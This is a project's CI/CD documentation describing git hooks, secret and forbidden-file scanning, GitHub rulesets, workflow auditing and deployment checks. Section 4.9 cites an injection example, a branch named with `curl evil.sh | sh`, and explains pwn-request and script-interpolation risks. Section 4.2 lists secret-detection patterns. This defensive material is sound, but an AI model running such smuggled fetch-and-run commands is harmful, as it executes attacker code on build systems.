# CI/CD Pipeline

> The authoritative description of how code gets into this repository, and of
> everything that stops the wrong code from getting in.
>
> Related: [GITHUB_WORKFLOW](./GITHUB_WORKFLOW.md) · [CONTRIBUTING](../CONTRIBUTING.md) ·
> [ARCHITECTURE](./architecture.md) · [PRD](./PRD.md)

---

## 1. The idea in one paragraph

The pipeline is built around one principle: **a check that can be skipped is not
a check.** Every job that a pull request must be judged by runs and always
reports a conclusion — pass or fail — rather than disappearing as "skipped", so
that it can be a *required status check* without deadlocking a merge. Jobs whose
work does not exist yet (there is no `package.json` yet, no `supabase/`
directory, no Playwright suite) explicitly succeed with a `::notice::` explaining
that they are waiting for Phase 0, 2 or 7. The moment the code lands, the check
starts doing real work with no change to the workflow.

Two jobs are deliberately conditional, and both are safe as required checks:

- `PR Conventions` and `Dependency Review` only run on `pull_request`, because
  there is no pull-request title or dependency diff on a push to `main`.
- `Verify` and `Accessibility` sit behind `Repository Hygiene`, so a failing
  hygiene gate skips them instead of spending a runner on a build that cannot
  merge. GitHub treats a skipped required check as satisfied, so this never
  blocks a merge — the failing hygiene check is what blocks it.

The second principle: **the same script, everywhere.** `scripts/checks/` is
dependency-free shell. It runs in `.githooks/pre-commit` on a contributor's
laptop and in `.github/workflows/ci.yml` on a runner. There is no "works on my
machine" version of the rules.

---

## 2. Map of the pipeline

```
                        ┌──────────────────────────────────────────┐
   contributor          │  .githooks/pre-commit                    │
   git commit  ────────▶│  forbidden files · secrets · size ·      │
                        │  whitespace · lockfiles                  │
                        └──────────────────┬───────────────────────┘
                                           │ pass
                        ┌──────────────────▼───────────────────────┐
   contributor          │  .githooks/commit-msg                    │
   git commit  ────────▶│  Conventional Commits                    │
                        └──────────────────┬───────────────────────┘
                                           │ pass
                        ┌──────────────────▼───────────────────────┐
   contributor          │  .githooks/pre-push                      │
   git push    ────────▶│  refuse direct push to main ·            │
                        │  re-run the whole gate on the branch     │
                        └──────────────────┬───────────────────────┘
                                           │ pass
                        ┌──────────────────▼───────────────────────┐
   GitHub               │  Branch protection ruleset               │
   pull request ───────▶│  no direct pushes · 1 code-owner review  │
                        │  linear history · squash only · signed   │
                        └──────────────────┬───────────────────────┘
                                           │
        ┌──────────────────────────────────┼──────────────────────────────────┐
        │                                  │                                  │
┌───────▼────────┐ ┌───────────────────┐ ┌▼──────────────────┐ ┌─────────────▼──────┐
│ ci.yml         │ │ security.yml      │ │ codeql.yml        │ │ db-check.yml       │
│                │ │                   │ │                   │ │                    │
│ Repository     │ │ Secret Scan       │ │ CodeQL Analysis   │ │ Database           │
│ Hygiene        │ │ Dependency Review │ │                   │ │ (Migrations & RLS) │
│ Verify         │ │                   │ │                   │ │                    │
│ Accessibility  │ └───────────────────┘ └───────────────────┘ └────────────────────┘
│                │
└───────┬────────┘ ┌───────────────────┐ ┌───────────────────┐ ┌────────────────────┐
        │         │ e2e.yml           │ │ labels-sync.yml   │ │ reconcile.yml      │
        │         │ End-to-End Tests  │ │ label taxonomy    │ │ scheduled sync     │
        │         └───────────────────┘ └───────────────────┘ └────────────────────┘
        │         ┌───────────────────┐ ┌───────────────────┐ ┌────────────────────┐
        │         │ stale.yml         │ │ protect-main.yml  │ │ db-migrate.yml     │
        │         │ housekeeping      │ │ push audit        │ │ prod migrations    │
        │         └───────────────────┘ └───────────────────┘ └────────────────────┘
        │         ┌───────────────────┐ ┌───────────────────┐ ┌────────────────────┐
        │         │ workflow-         │ │ scorecard.yml     │ │ release-drafter.yml │
        │         │ security.yml      │ │ supply-chain      │ │ release notes      │
        │         │ zizmor audit      │ │ posture           │ │ (never publishes)  │
        │         └───────────────────┘ └───────────────────┘ └────────────────────┘
        │         ┌───────────────────┐
        │         │ pr-conventions.yml│
        │         │ PR Conventions    │
        │         └───────────────────┘
        │
        ▼
   Vercel (Preview per PR, Production on main) — native Git integration.
   GitHub Actions is the quality gate, NOT the deployer. See §7.
        │
        ▼
   smoke.yml — after every successful deployment, does the published URL
   actually render? See §7.2.
```

---

## 3. Required status checks

These are the exact `name:` values of the jobs that must pass before a pull
request can be merged. They are applied by
`.github/branch-protection/apply.sh`.

| Check | Workflow | What it guarantees |
|---|---|---|
| `Repository Hygiene` | `ci.yml` | no forbidden files, no oversized files, valid YAML, valid CODEOWNERS, valid ruleset payloads, clean whitespace (credentials are `Secret Scan`'s job) |
| `PR Conventions` | `pr-conventions.yml` | Conventional Commit title, valid branch name, reviewable size, linear history (a linked issue is a warning, not a requirement). Re-runs when the title, description or labels change, so fixing a title needs no new commit |
| `Verify (Lint · Types · Tests · Build)` | `ci.yml` | ESLint, TypeScript, Prettier, Vitest and `next build` all pass |
| `Secret Scan` | `security.yml` | no credential material in any tracked file, no private keys by filename |
| `Dependency Review` | `security.yml` | no new moderate-or-higher vulnerability, no disallowed licence |

Advisory checks (valuable, but not blocking while the project is greenfield):

| Check | Activates when |
|---|---|
| `Accessibility (Lighthouse)` | the Next.js application exists |
| `End-to-End Tests` | `playwright.config.ts` exists |
| `Database (Migrations & RLS Tests)` | `supabase/config.toml` exists |
| `CodeQL Analysis` | `package.json` + `pnpm-lock.yaml` exist |
| `Workflow Security` | always (the workflows themselves are the input) |
| `Scorecard Analysis` | always on `main` and weekly — it scores the repository, not a pull request |
| `Release Drafter` | never a gate; it only writes a draft release |
| `Deployment Smoke Test` | when a deployment publishes a URL |

`Workflow Security` is the first candidate for promotion: it runs on every pull
request, always reports a conclusion, and a failure means the pipeline has
acquired a defect that runs with a write token. Promote it by adding
`{ "context": "Workflow Security" }` to `required_status_checks` in
`.github/branch-protection/rulesets/protect-main.json` and re-running `apply.sh`
(`check-rulesets.sh` will confirm the context matches a real job before GitHub
ever sees it).

Once each of the other rows lands, add its `name:` the same way. Do not add a
context that is emitted only on `paths:`-filtered workflows to a branch whose
pull requests do not change those paths — the check would be skipped, which
GitHub treats as satisfied, so it would gate nothing.

---

## 4. The "no unwanted code" rules

This is the part of the pipeline that answers *"so that no unwanted code gets
pushed"*. Every rule below is enforced by a script in `scripts/checks/`, runs
locally and in CI, and can be tested by hand.

### 4.1 Forbidden files — `check-forbidden-files.sh`

Blocks anything that has no business in version control:

| Category | Examples |
|---|---|
| Foreign lockfiles | `package-lock.json`, `yarn.lock`, `bun.lockb`, `.npmrc`, `.yarnrc` |
| Secrets & certificates | `.env`, `.env.local`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `id_rsa*`, `secrets.json` |
| Build output | `node_modules/`, `.next/`, `dist/`, `build/`, `out/`, `coverage/`, `.turbo/`, `.vercel/` |
| Tool caches | `.pnpm-store/`, `.parcel-cache/`, `.mypy_cache/`, `__pycache__/`, `playwright-report/` |
| OS droppings | `.DS_Store`, `Thumbs.db`, `._*`, `desktop.ini` |
| Editor state | `.idea/`, `*.iml`, `*.swp`, `Session.vim`, `.history/` |
| Logs & scratch | `*.log`, `*.bak`, `*.orig`, `*.tmp`, `*.patch` |
| Archives & binaries | `*.zip`, `*.tar.gz`, `*.exe`, `*.dmg`, `vendor/` |

Exceptions live in `.github/allowed-files.txt`, are visible in the pull request
diff, and are covered by CODEOWNERS.

### 4.2 Secret scanning — `check-secrets.sh`

Content-based scanning of every tracked text file, for:

- `-----BEGIN … PRIVATE KEY-----` blocks
- GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, `github_pat_`)
- AWS access key IDs (`AKIA…`) and secret access keys
- Google API keys (`AIza…`), Slack tokens and webhooks, Stripe live keys,
  npm tokens, SendGrid keys, Twilio keys
- **Supabase service-role JWTs** — flagged specially, because this one key
  bypasses Row Level Security and would expose the whole database
- Generic `password|secret|token|api_key = "…"` assignments, as warnings

Lines containing `PLACEHOLDER`, `CHANGEME`, `<something>`, `your-`, `…`, or a
`process.env` / `import.meta.env` indirection are treated as documentation and
not reported. `--strict` promotes warnings to errors; CI uses `--strict`.

A full-history Gitleaks sweep runs in addition when `GITLEAKS_LICENSE` is
configured (see §8).

**Binary detection is byte-based and locale-independent** (`select_text_files`
in `lib/common.sh`). An earlier version compared a character count against a
byte count, so under the runners' `C.UTF-8` locale any file containing a
non-ASCII character — an em dash, a ✓, a © — was classified as binary and
skipped: on `main` the scan covered 12 of 75 tracked files. The log line
`Scanned N text file(s), skipped M binary or empty file(s)` is the thing to
watch; `M` should be the number of images and fonts, nothing more.

### 4.3 Lockfile policy — `check-lockfiles.sh`

`pnpm-lock.yaml` is the only lockfile allowed. If `package.json` exists,
`pnpm-lock.yaml` must exist too. CI additionally verifies that
`pnpm install --frozen-lockfile` does not mutate the lockfile, which is what
catches a contributor who edited `package.json` by hand.

### 4.4 Large files — `check-large-files.sh`

Hard limit 1 MiB per file, soft limit 512 KiB. Git clones are forever; an 8 MB
screenshot is downloaded by every contributor, on every clone, for the life of
the repository. Exceptions go in `.github/large-files.allowlist` with a written
justification.

### 4.5 Text hygiene — `check-text-hygiene.sh`

No trailing whitespace (Markdown's two-space hard break excepted), no tabs, no
CRLF, exactly one trailing newline, no BOM (warning), no lines over 400
characters (warning). These are the defects that produce 400-line "formatting
only" diffs and make `git blame` useless.

CRLF is read from `git ls-files --eol`, and specifically from the **index**
column: that is what gets committed. `grep $'\r'` cannot do this job on Windows —
GNU grep there strips the carriage return before matching unless given `-U` — and
a Windows clone with `core.autocrlf` legitimately has CRLF in its working tree.

**Speed.** The gate runs on every `git push`, so it is written to cost a fixed
handful of processes rather than a dozen per file: one `grep` decides which files
are text, one `grep` per secret pattern set, one `awk` pass for every line-level
hygiene rule, one `tail` for final newlines, one `stat` for sizes. On Git for
Windows — where process start-up is nearly the whole cost — the full gate went
from 63 s to 4 s on a 75-file tree, and it no longer grows by seconds for every
file the application adds.

### 4.6 Branch naming — `check-branch-name.sh`

`<type>/<short-description>` where type is `feat|fix|docs|style|refactor|perf|
test|build|ci|chore|revert`. `main`, `develop`, `staging`, `release/*`,
`hotfix/*`, `dependabot/*` and `arena/*` are allowlisted, and so is
`revert-<number>-<branch>`, the name GitHub's **Revert** button gives the branch
it creates.

### 4.7 Commit messages — `check-commit-msg.sh`

Conventional Commits, because the project squash-merges and the PR title becomes
the commit on `main`, and because `CHANGELOG.md` is generated from these
headers. A `Revert "<original subject>"` header — what `git revert` and GitHub's
Revert button write — is accepted as-is, as commitlint does; the `PR Conventions`
title check accepts the same form.

### 4.8 Pull-request discipline — `check-pr-meta.sh`

- PR title must be a Conventional Commit header
- Branch name must follow the convention
- The PR should link an issue (warning, so quick doc fixes are not blocked)
- The description must actually be filled in (warning)
- **Size limits**: warn above 400 lines / 20 files, fail above 10000 lines / 300
  files. CONTRIBUTING.md says "a PR that fixes three bugs and redesigns two
  pages is difficult to review and will likely be rejected" — this is that
  sentence, made mechanical.

  A pull request carrying the `size: exempt` label skips the size check. That
  label exists because a purely mechanical limit eventually blocks the *right*
  change: adding this pipeline produced a 4,900-line pull request that could not
  have been split into anything reviewable. The exemption is a label rather than
  a title flag so that it is visible in the sidebar, auditable in the label's
  history, and easy to revoke — and every use emits a warning in the Checks tab
  so nobody forgets why.
- **No merge commits** in the pull request (linear history)
- No forbidden files *added or modified* in the diff — deleting one is the fix,
  so deletions are not reported

These run in `pr-conventions.yml`, which re-runs on `edited`, `labeled` and
`unlabeled` as well as on a push. A Re-run replays the original event, so when
this job lived in `ci.yml` a corrected title or a newly applied `size: exempt`
label could never turn it green without a new commit. All three validation steps
run even when an earlier one fails, so one run reports every problem.

### 4.9 The workflows themselves — `Workflow Security` (`zizmor`)

Every other rule here polices the code that gets committed. Nothing policed the
YAML that does the policing, and YAML is where a GitHub Actions pipeline is
attacked:

- a contributor-controlled string (PR title, branch name, issue body) expanded
  into a `run:` block — a branch called `x; curl evil.sh | sh` is a valid branch
  name
- `pull_request_target` combined with a checkout of the head — the "pwn request"
  pattern, which hands a write token to a fork's code
- the checkout credential left in `.git/config` and then shipped inside an
  uploaded artifact
- an action referenced by anything other than a full commit SHA

`zizmor` audits all of them, and `Workflow Security` fails the pull request with
a file, a line and an audit name. Every action is SHA-pinned with its release in
a trailing comment (`@<sha> # v5.1.0`), which Dependabot keeps current; the one
deliberate exception — `pull_request_target` in `pr-automation.yml`, which checks
out nothing — is written down with its reasoning in `.github/zizmor.yml`, so an
exception is a reviewed decision rather than a silenced warning.

This check exists because the audit found real defects on its first run:

| Found | Why it mattered |
|---|---|
| `supabase/setup-cli@v1` and `actions/dependency-review-action@v4` | both are **branches**, not tags — a moving ref that can change between runs |
| `protect-main.yml` ran `git rev-parse` without a checkout | every run saw an empty subject and raised a **false incident** |
| `protect-main.yml` interpolated a commit subject into a `github-script` body | a subject containing a backtick or a quote is remote code execution |
| `pr-automation.yml` checked out the pull-request **head** under `pull_request_target` | arbitrary code from a fork, with a write token |
| `stale.yml` deleted branches with a read-only token | every `deleteRef` returned 403 and the branch was silently kept |

### 4.10 Documentation integrity — `check-docs.sh`

The documents in `docs/` are the specification — the PRD, the schema, the
integration contract — so a link to a file that no longer exists is a
specification nobody can follow.

- every document the project promises to maintain is present
- every relative link and image path in every tracked Markdown file resolves
- no document has more than one H1

External URLs are deliberately not checked: a network-dependent link check fails
when GitHub rate-limits a runner, and a check that fails for reasons unrelated
to the change is a check people learn to ignore.

It paid for itself immediately — the first run found eight broken links, all of
them pointing at `./ARCHITECTURE.md` (the file is `docs/architecture.md`, and
GitHub's links are case-sensitive) plus a `CONTRIBUTING.md` link in
`.github/PULL_REQUEST_TEMPLATE.md` that resolves relative to `.github/`.

### 4.11 Shell that runs the gate — `bash -n` and `shellcheck`

`scripts/checks/` is the gate, and it is shell. A syntax error in one of those
scripts does not produce a failing check; it produces a check that stops running
— the worst possible outcome for a pipeline whose premise is "nothing merges
unless it is checked". Two steps in `Repository Hygiene` cover it:

- `bash -n` parses every script in the repository without executing it
- `shellcheck -S warning -x` lints them at the level where a finding is a defect
  rather than a style opinion

Both enumerations come from `scripts/ci/shell-scripts.sh`, which selects files by
shebang — `git ls-files '.githooks/*'` also returns `.githooks/README.md`, and
feeding Markdown to `bash -n` fails on a perfectly valid file.

---

## 5. Applying branch protection

The rulesets in `.github/branch-protection/` are the most important
configuration in the pipeline: they are what make everything above *mandatory*
rather than advisory. There are four of them, plus one opt-in.

Why more than one: a ruleset carries a single target (`branch` or `tag`) and a
single `name`, so a tag rule and a branch rule cannot live in the same file.
Layering is also how GitHub intends the feature to be used — every ruleset whose
conditions match a ref is enforced, and the most restrictive combination wins.
Splitting them keeps each file readable and lets one be switched off (set
`"enforcement": "disabled"`) without touching the others.

| File | Name | Target | Enforces |
|---|---|---|---|
| `rulesets/protect-main.json` | Protect main | default branch | the full merge gate — see §5.1 |
| `rulesets/protect-release-branches.json` | Protect release branches | `release/**`, `hotfix/**`, `support/**` | no force-push, no deletion, reviewed PRs — §5.2 |
| `rulesets/protect-tags.json` | Protect release tags | `refs/tags/v*` | no deletion, no force-push, no re-pointing, semver names — §5.3 |
| `rulesets/branch-naming.json` | Branch naming | all branches except bots/main/release | `<type>/<description>` names — §5.4 |
| `optional/require-signed-commits.json` | Require signed commits | default branch | **opt-in**, not applied by default — §5.5 |

```bash
bash .github/branch-protection/apply.sh --list      # what exists vs. what is defined
bash .github/branch-protection/apply.sh --dry-run   # inspect the exact payloads first
bash .github/branch-protection/apply.sh             # apply all four
bash .github/branch-protection/apply.sh --remove    # remove the managed rulesets

# a single file, including the opt-in one
bash .github/branch-protection/apply.sh --file rulesets/protect-tags.json
bash .github/branch-protection/apply.sh --file optional/require-signed-commits.json
bash .github/branch-protection/apply.sh --remove --file optional/require-signed-commits.json
```

`apply.sh` validates every payload before it makes a single API call, writes
the API body to a gitignored `*.payload.json` (documentation keys starting with
`_` are stripped), and matches existing rulesets by `name` — so it is
idempotent, and renaming a *file* is safe while renaming a *ruleset* leaves the
old one behind (that is what `--remove` before `--apply` is for).

The payloads are also checked by `scripts/checks/check-rulesets.sh`, which runs
in `Repository Hygiene` and in the local gate. It fails on an unknown rule type,
a missing required parameter, an invalid regex, two files claiming the same
ruleset name — and, most importantly, on a required status check that names a
job no workflow emits, because that check could never report and the branch
would be permanently unmergeable.

**This cannot be done with a GitHub App installation token.** `apply.sh`
probes for write access before it touches anything and prints the diagnosis,
because the failure mode is genuinely confusing: the token reports `admin: true`
on the repository and still gets `Resource not accessible by integration (HTTP
403)` on every ruleset, branch-protection and repository-settings endpoint.

The reason is that the missing permission is on the **App**, not on the account.
Granting the account write access to the repository changes nothing — the App
configuration is what has to carry the permission. Three ways forward:

| Option | How | Keeps automation working? |
|---|---|---|
| **A** | Org Settings → Developer settings → GitHub Apps → *your app* → Permissions & events → Repository permissions → **Administration: Read and write** → Save → an org owner approves | **Yes** |
| **B** | `gh auth logout && gh auth login` with a classic PAT carrying the `repo` scope, then re-run `apply.sh` | No, one-shot |
| **C** | Settings → Rules → Rulesets → New ruleset → **Import a ruleset**, one paste per file in `rulesets/` | No, one-shot |

Option A is the only one that lets a workflow or future automation change the
rulesets on its own.

Everything else in the pipeline works without this step. The rulesets are what
make the checks *mandatory*; until they are applied, a contributor with push
access can still commit straight to `main` and merge a red build.

### 5.1 `protect-main.json` — the merge gate

| Rule | Why |
|---|---|
| No deletion | a deleted branch can take an open PR's history with it |
| No force-push (`non_fast_forward`) | history rewriting on `main` destroys review evidence |
| Required linear history | every commit on `main` is one reviewed change |
| Pull request required | nobody commits to `main` directly |
| 1 approving review, code-owner review required | `.github/CODEOWNERS` decides who |
| Stale reviews dismissed on push | an approval of code that no longer exists is not an approval |
| Last-push approval required | the person who pushed last cannot self-approve the final state |
| Required review-thread resolution | no unresolved "this is wrong" left behind |
| Squash merge only | matches the Conventional Commit title rule |
| Branches up to date before merging | prevents merging something that was never tested against current `main` |
| Required status checks | the five in §3 |

`require_code_owner_review` is why `.github/CODEOWNERS` lists individual
`@usernames` instead of `@Open-Source-Software-Club/*` teams: a CODEOWNERS entry
that names a team which does not exist matches nothing, which would make the
requirement permanently unsatisfiable and block every merge.

> **Note on bypass actors:** every ruleset ships with an empty bypass list,
> which is deliberate. Even repository administrators are bound by it. An
> administrator who genuinely needs to push to `main` (an incident, a botched
> migration) can add a temporary bypass actor, but
> `.github/workflows/protect-main.yml` will raise an incident issue when they do,
> so the bypass is never silent.

### 5.2 `protect-release-branches.json` — the release trains

`release/**`, `hotfix/**` and `support/**` are the branch families that
`check-branch-name.sh` and `CONTRIBUTING.md` already recognise. They have the
same problem as `main`: cut once, built against for weeks, and they must not move
under the feet of whoever is testing them.

| Rule | Why |
|---|---|
| No deletion | it removes the evidence of what was shipped |
| No force-push | it silently changes what was shipped |
| Pull request + 1 approval | a release train is still reviewed work |
| Squash **or** merge | a backport that must also land on `main` legitimately needs a merge commit, so linear history is deliberately *not* required here |

There are **no required status checks** on this ruleset, on purpose. Every
workflow in the repository is triggered by pull requests that target `main`
(`pull_request: branches: [main]`), so those contexts never report on a PR
targeting `release/1.2` — requiring them would make the branch permanently
unmergeable. If release branches ever get their own CI trigger, add the
contexts and re-run `apply.sh`.

### 5.3 `protect-tags.json` — release tags are immutable

A tag is what an artifact claims to be. If `v1.0.0` can be moved after the fact,
it stops meaning "the commit we reviewed and shipped", and every downstream
consumer — a container image, a Vercel build, a fork pinned to a release — is
trusting a mutable pointer.

| Rule | Why |
|---|---|
| No deletion | the tag is the only durable pointer to a shipped commit |
| No force-push | a force-pushed tag silently rewrites history |
| `update` blocked | an existing tag cannot be re-pointed at a different commit |
| `tag_name_pattern` | only `v<major>.<minor>.<patch>[-prerelease]`; `v1`, `v1.2` and `latest` are rejected, because `CHANGELOG.md` promises semver |

Prereleases are cut as `v1.2.0-rc.1`. Creating a tag is *not* restricted — the
Release Drafter publish step and a maintainer's `git push --tags` both need it.

### 5.4 `branch-naming.json` — the convention, enforced by the server

This is the remote half of `scripts/checks/check-branch-name.sh`. Until it
existed, the convention was enforced exactly as well as each contributor's
`bash scripts/install-hooks.sh` — that is, not at all for anyone who skipped the
hook or used the web UI.

The rule is `branch_name_pattern` with the same regex the local script uses:
`<type>/<description>` where type is one of the Conventional Commit types, and
the description is lowercase. `dependabot/**`, `arena/**`, `renovate/**` and the
other automation prefixes are excluded, as are `main`, `master` and the release
trains. **A new bot needs its prefix added to `exclude`**, or its pushes are
rejected.

This is the most opinionated ruleset in the set, because it *rejects a push* and
GitHub's error message is not friendly. If the friction is ever judged too high
for a first-time contributor, set `"enforcement": "disabled"` in the file and
re-run `apply.sh` — do not delete the file, or the decision disappears from the
history.

### 5.5 Signed commits — opt-in, and why

`required_signatures` is **not** in the default set. It is good practice, but it
requires every contributor to configure GPG or SSH commit signing, which is a
genuine barrier to a student's first open-source contribution. It ships as
`optional/require-signed-commits.json` so a team that has decided to sign can
turn it on with one command:

```bash
bash .github/branch-protection/apply.sh --file optional/require-signed-commits.json
```

The file's header documents the prerequisites (key configuration, how to check
the existing history with `git log --format='%h %G? %s'`, and the fact that a
squash merge is signed by GitHub rather than the author, so squash merging keeps
working).

### 5.6 Not yet possible: push rulesets

Push rulesets block pushes by file path, extension, size and path length across a
repository and its whole fork network — the server-side equivalent of
`check-large-files.sh` and `check-forbidden-files.sh`, and strictly better,
because a fork cannot bypass it.

They require the **GitHub Team plan** for private and internal repositories.
This repository is public, but the plan is Free, so they are not part of the
default set. When the club upgrades, create `rulesets/push-rules.json` with this
body and add it to the loop in `apply.sh`:

```json
{
  "name": "Push rules",
  "target": "push",
  "enforcement": "active",
  "conditions": null,
  "rules": [
    { "type": "max_file_size",
      "parameters": { "max_file_size": 1 } },
    { "type": "file_extension_restriction",
      "parameters": { "restricted_file_extensions": [
        "*.zip", "*.tar.gz", "*.jar", "*.exe", "*.dmg", "*.iso",
        "*.pem", "*.key", "*.p12", "*.pfx", "*.keystore"
      ] } },
    { "type": "max_file_path_length",
      "parameters": { "max_file_path_length": 200 } }
  ],
  "bypass_actors": []
}
```

`max_file_size` is in **megabytes**, so `1` matches the 1 MiB limit in
`check-large-files.sh`. Push rules have no bypass for ordinary contributors and
apply to every fork, so roll them out with `"enforcement": "disabled"` first if
the team wants to read the rule insights before anything is rejected.

---

## 6. What runs where

| Workflow | Trigger | Jobs |
|---|---|---|
| `ci.yml` | PR, push to `main`, manual | Repository Hygiene · Verify · Accessibility |
| `pr-conventions.yml` | PR opened / edited / synchronised / reopened / labelled / unlabelled | PR Conventions |
| `security.yml` | PR, push to `main`, weekly, manual | Secret Scan · Dependency Review |
| `codeql.yml` | PR, push to `main`, weekly, manual | CodeQL Analysis |
| `db-check.yml` | PR touching `supabase/**`, push to `main` | Database (Migrations & RLS Tests) |
| `e2e.yml` | PR and push to `main`, except documentation-only changes | End-to-End Tests |
| `pr-automation.yml` | PR opened / edited / synchronised / reopened | Apply labels from the diff |
| `labels-sync.yml` | weekly, on a `labels.yml` change reaching `main`, manual | Sync labels (this repository) · Sync labels (all organisation repositories) |
| `reconcile.yml` | every 15 minutes once `SITE_URL` is set, manual | Reconcile GitHub cache |
| `db-migrate.yml` | manual only, environment-gated; production only from `main` | Preflight checks · Apply migrations |
| `stale.yml` | weekly | Stale pull requests · Delete merged branches |
| `protect-main.yml` | push to `main` | Audit direct pushes to main |
| `workflow-security.yml` | PR, push to `main`, weekly, manual | Workflow Security |
| `scorecard.yml` | push to `main`, weekly, branch-protection change, manual | Scorecard Analysis |
| `release-drafter.yml` | push to `main`, manual | Draft release notes |
| `smoke.yml` | `deployment_status`, manual | Deployment Smoke Test |

### Why `paths:` filters only appear on the non-required workflows

`ci.yml` and `security.yml` deliberately have **no** `paths:` filter. A
documentation-only pull request still runs the full hygiene and secret gate,
because a documentation-only pull request is exactly where a `.env` file or a
screenshot of a credentials page tends to slip in. The expensive, application
specific jobs are filtered so a copy tweak does not spin them up:
`db-check.yml` runs only when `supabase/**` changes, and `e2e.yml` skips
documentation-only changes (`**/*.md`, `docs/**`).

`e2e.yml` is filtered by what it can *ignore*, not by what it watches. It used
to watch only `tests/e2e/**` and the Playwright config, so a change to the
application — the thing the suite exists to protect — never ran it.

---

## 7. Deployment

**GitHub Actions does not deploy. Vercel does.**

`docs/GITHUB_WORKFLOW.md` is explicit about this: *"Vercel native Git
integration for Preview (every PR) and Production (`main`) deploys… Don't
duplicate deploys from Actions."* Duplicating the deploy means two systems racing
to publish, and a green Actions run that deployed something different from what
Vercel deployed.

The division of responsibility:

| System | Responsibility |
|---|---|
| GitHub Actions | the **quality gate**: nothing merges unless it is correct |
| Vercel | **deployment**: Preview per pull request, Production on `main` |
| `smoke.yml` | **verification**: did the thing Vercel published actually render? |
| `db-migrate.yml` | **production schema changes**, with human approval |
| `release-drafter.yml` | **release notes**: a draft, never a publish, never a deploy |

### 7.1 Release notes

`release-drafter.yml` updates a single draft release on every push to `main`,
grouping merged pull requests by the labels in `.github/labels.yml`. Because the
repository squash-merges, the pull-request title *is* the commit on `main` — the
same convention "PR Conventions" enforces is what makes the draft readable.

It never publishes. Cutting a release is: read the draft, set the version, press
publish — and paste the result into `CHANGELOG.md`, whose Keep a Changelog
structure the template mirrors.

### 7.2 Post-deployment smoke test

CI can be green, Vercel can report a successful deployment, and the site can
still return a 500 — a rotated Supabase key, an environment variable missing
from the production scope, a broken redirect. `smoke.yml` closes that gap: on
the `deployment_status` event from the Vercel integration it requests the
published URL and asserts that

1. the URL answers `200` (six attempts, because a CDN needs a moment),
2. the body is a rendered HTML document rather than a 500-byte error page,
3. there is no Next.js error marker in the response,

and then reports six security headers (`x-content-type-options`,
`referrer-policy`, `strict-transport-security`, `x-frame-options`,
`content-security-policy`, `permissions-policy`) in the run summary. The headers
are advisory: they are configured in the deployment platform, not in this
repository, and a first deploy legitimately has none of them.

There is no checkout and no repository code executes in that job — it is a
handful of HTTP requests. With no deployment URL configured it reports a notice
and succeeds, so it can be a check from day one.

### Production database migrations

Migrations are never applied from a pull request. They go through
`.github/workflows/db-migrate.yml`, which requires:

1. A manual `workflow_dispatch` with the literal string `MIGRATE` typed into a
   confirmation field.
2. Approval from a reviewer on the `production` (or `staging`) GitHub
   environment.
3. `SUPABASE_ACCESS_TOKEN`, `SUPABASE_DB_PASSWORD` and `SUPABASE_PROJECT_REF`
   configured as **environment secrets**, not repository secrets — so they only
   exist for that environment and only for that job.

The CLI version is pinned in one place, `env.SUPABASE_CLI_VERSION`, and both
`db-check.yml` and `db-migrate.yml` read it: the migration is applied to
production by exactly the CLI that proved it applies cleanly, and a CLI major
release cannot change either workflow's behaviour on a Tuesday morning.

---

## 8. Configuration the pipeline needs

None of these are required for the gate to work; they upgrade specific checks.

| Where | Name | Effect |
|---|---|---|
| Repository variable | `SITE_URL` | enables the `reconcile.yml` scheduler and the post-migration reconcile |
| Repository secret | `CRON_SECRET` | bearer token for `/api/cron/reconcile` |
| Repository secret | `GITLEAKS_LICENSE` | enables the full-history Gitleaks sweep in `security.yml` |
| Repository secret | `SUPABASE_ACCESS_TOKEN` | production migrations |
| Environment secret | `SUPABASE_DB_PASSWORD` | production migrations |
| Environment secret | `SUPABASE_PROJECT_REF` | production migrations |
| Repository secret | `ORG_LABELS_SYNC_TOKEN` | enables organisation-wide label sync |
| Repository variable | `SITE_URL` | target of the manual `smoke.yml` run and the post-migration reconcile |

The `Dependency Review` check additionally needs the **dependency graph** to be
enabled: *Settings → Code security → Dependency graph*. When it is off, the
action fails with an opaque "not supported on this repository" error, so the job
checks first and reports exactly what to enable. It is also a no-op until a
`package.json` exists — there are no dependencies to review yet.

Also turn on, in **Settings → Code security**:

- **Secret scanning** and **push protection**. This catches a secret *before* it
  reaches the repository, which is the only point at which catching it is cheap.
- **Dependabot alerts** and **Dependabot security updates**.

`Workflow Security` and `Scorecard Analysis` need no configuration: zizmor is
installed at a pinned version by the workflow itself, and Scorecard reads the
repository through the token. `Scorecard Analysis` publishes nothing outside
GitHub while `publish_results: false`; flip it to `true` (and add the badge to
`README.md`) when the maintainers want a public score.

---

## 9. Running the checks by hand

```bash
# Everything, against the whole working tree
./scripts/checks/run-all.sh

# Only what is staged (what the pre-commit hook runs)
./scripts/checks/run-all.sh --staged

# Paranoid mode: warnings become errors
./scripts/checks/run-all.sh --strict

# A single check
bash scripts/checks/check-secrets.sh
bash scripts/checks/check-forbidden-files.sh
bash scripts/checks/check-docs.sh             # docs links, H1s, required files
bash scripts/checks/check-pr-meta.sh          # needs the PR_* env vars

# The pipeline's own shell, exactly as CI lints it
mapfile -t scripts < <(bash scripts/ci/shell-scripts.sh)
shellcheck -S warning -x "${scripts[@]}"
for script in "${scripts[@]}"; do bash -n "$script"; done

# The pipeline's own YAML, exactly as CI audits it
pipx install zizmor==1.32.0                   # or: uv tool install zizmor
zizmor --config .github/zizmor.yml .github/workflows

# Install the git hooks
./scripts/install-hooks.sh
```

---

## 10. Extending the pipeline

**How actionlint is run**

`.github/workflows/ci.yml` downloads a pinned `actionlint` release binary rather
than running the Docker image. `docker run` on GitHub-hosted runners mounts the
workspace with the runner's uid, which the image's non-root user cannot read,
and the failure surfaces as an opaque exit code 125 with no indication of which
step failed. The binary is fetched with `curl`, pinned by version, and run with
`--shellcheck= --pyflakes=` so the check depends on no external analyser.

**Adding a new check**

1. Write `scripts/checks/check-<thing>.sh`. Source `lib/common.sh`; use
   `record_error` / `record_warning`; end with `finish "<label>"`. Never `exit 1`
   on the first problem — collect everything and report once.
2. Call it from `scripts/checks/run-all.sh` (local) and from the appropriate job
   in `.github/workflows/` (CI).
3. If it must block merges, make it run unconditionally and give it a stable
   `name:`, then add that name to the `required_status_checks` list in
   `.github/branch-protection/rulesets/protect-main.json` and re-run
   `apply.sh`. `check-rulesets.sh` fails the build if the context does not
   match a job name, so the typo never reaches GitHub.

**Adding a new workflow**

Follow the shape of the existing ones:

```yaml
name: Thing
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
concurrency:
  group: thing-${{ github.ref }}
